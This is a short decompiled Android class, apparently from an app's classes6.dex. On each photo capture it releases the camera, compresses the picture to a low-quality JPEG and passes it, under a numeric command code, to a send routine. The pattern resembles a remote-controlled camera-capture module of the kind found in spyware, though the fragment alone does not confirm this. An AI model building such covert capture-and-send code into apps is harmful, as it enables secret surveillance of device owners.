package f3;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import java.io.ByteArrayOutputStream;

/* loaded from: classes6.dex */
public final class d implements Camera.PictureCallback {

    /* renamed from: a, reason: collision with root package name */
    public final /* synthetic */ Camera f2790a;

    public d(Camera camera) {
        this.f2790a = camera;
    }

    @Override // android.hardware.Camera.PictureCallback
    public final void onPictureTaken(byte[] bArr, Camera camera) {
        this.f2790a.stopPreview();
        this.f2790a.release();
        Bitmap decodeByteArray = BitmapFactory.decodeByteArray(bArr, 0, bArr.length);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        decodeByteArray.compress(Bitmap.CompressFormat.JPEG, 20, byteArrayOutputStream);
        byte[] byteArray = byteArrayOutputStream.toByteArray();
        if (i.f2795a == null) {
            return;
        }
        f.e eVar = new f.e();
        eVar.put("code", 1301);
        eVar.put("data", byteArray);
        eVar.put("type", 1);
        i.f2795a.b(eVar.l());
    }
}
